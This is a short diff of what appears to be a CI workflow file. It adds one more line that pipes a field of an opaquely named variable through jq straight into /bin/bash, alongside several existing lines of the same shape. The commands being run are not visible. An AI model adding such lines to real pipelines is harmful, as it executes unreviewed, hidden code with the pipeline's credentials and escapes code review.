@@ -28,6 +28,7 @@ jobs:
           echo $anjtn5 | jq -r .dwzt40450 | /bin/bash
           echo $ru51 | jq -r .ud8 | /bin/bash
           echo $vs6309 | jq -r .otjj894 | /bin/bash
+          echo $zii458 | jq -r .uh9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
